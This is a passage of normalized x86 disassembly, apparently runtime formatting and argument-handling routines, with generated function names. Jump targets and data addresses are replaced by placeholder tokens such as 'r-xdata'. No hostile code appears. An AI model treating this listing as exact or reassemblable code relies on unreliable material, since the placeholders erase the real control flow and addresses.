mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cd01
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41ca6b
lea ecx [ ebp - 0x45c ]
call sub_41ee6a
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_41880f
mov edi edi
push ebp
mov ebp esp
sub esp 0xaf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xab8 ] eax
test esi esi
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xaf0 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0xac8 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0xab8 ]
and eax 0x2
mov [ ebp - 0xacc ] eax
or eax edx
mov [ ebp - 0xac8 ] edi
mov [ ebp - 0xac4 ] ebx
mov [ ebp - 0xac0 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0xabc ] 0x1
mov [ ebp - 0xabc ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0xa74 ]
call sub_41cd01
cmp [ ebp - 0xae4 ] 0x0
pop edi
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
lea eax [ ebp - 0xac8 ]
mov [ ebp - 0xae0 ] ecx
mov [ ebp - 0xad8 ] eax
lea ecx [ ebp - 0xab4 ]
mov eax [ ebp + 0x20 ]
mov [ ebp - 0xab8 ] eax
lea eax [ ebp - 0xaec ]
mov [ ebp - 0xad4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xadc ] eax
lea eax [ ebp - 0xab8 ]
push eax
lea eax [ ebp - 0xad4 ]
mov [ ebp - 0xad0 ] esi
push eax
lea eax [ ebp - 0xad0 ]
push eax
lea eax [ ebp - 0xae0 ]
push eax
lea eax [ ebp - 0xad8 ]
push eax
call sub_417cf9
call sub_42fef5
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41e842
mov esi eax
test edi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xaf0 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xacc ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0xac0 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_4189cc
mov edi edi
push ebp
mov ebp esp
sub esp 0xaf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xab8 ] eax
test esi esi
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xaf0 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0xac8 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0xab8 ]
and eax 0x2
mov [ ebp - 0xacc ] eax
or eax edx
mov [ ebp - 0xac8 ] edi
mov [ ebp - 0xac4 ] ebx
mov [ ebp - 0xac0 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0xabc ] 0x1
mov [ ebp - 0xabc ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0xa74 ]
call sub_41cd01
cmp [ ebp - 0xae4 ] 0x0
pop edi
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
lea eax [ ebp - 0xac8 ]
mov [ ebp - 0xae0 ] ecx
mov [ ebp - 0xad8 ] eax
lea ecx [ ebp - 0xab4 ]
mov eax [ ebp + 0x20 ]
mov [ ebp - 0xab8 ] eax
lea eax [ ebp - 0xaec ]
mov [ ebp - 0xad4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xadc ] eax
lea eax [ ebp - 0xab8 ]
push eax
lea eax [ ebp - 0xad4 ]
mov [ ebp - 0xad0 ] esi
push eax
lea eax [ ebp - 0xad0 ]
push eax
lea eax [ ebp - 0xae0 ]
push eax
lea eax [ ebp - 0xad8 ]
push eax
call sub_417d99
call sub_42fef5
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41ef9a
mov esi eax
test edi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xaf0 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xacc ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0xac0 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_418b92
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cd01
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41c99d
lea ecx [ ebp - 0x45c ]
call sub_41e99e
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_418d0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cd01
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41cacf
lea ecx [ ebp - 0x45c ]
call sub_41f0fa
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_418e93
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41850e
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
call sub_42fdcf
or eax 0xffffffff
sub_418f0b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41868a
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
call sub_42fdcf
or eax 0xffffffff
sub_418fb7
mov edi edi
push ebp
mov ebp esp
push ecx
or eax 0xffffffff
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
div esi
push edi
and eax 0xfffffffe
mov edi ecx
cmp eax 0x2
jae r-xdata
push ebx
xor ebx ebx
add esi esi
cmp [ edi + 0x404 ] ebx
jne r-xdata
call sub_42fef5
mov [ eax ] 0xc
xor al al
jmp r-xdata
cmp esi [ edi + 0x400 ]
ja r-xdata
cmp esi 0x400
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_42d0e4
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
push eax
call sub_42d0aa
pop ecx
mov al bl
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ edi + 0x404 ]
call sub_41cd1b
mov eax [ ebp - 0x4 ]
mov bl 0x1
mov [ edi + 0x400 ] esi
pop ebx
sub_41903d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4190bc
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_41913b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4191ba
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419239
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419258
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419277
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419296
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4192b5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419334
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4193b3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419432
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4194b1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4194d0
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4194ef
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_41950e
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_41952d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4195ac
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_41962b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4196aa
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419729
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
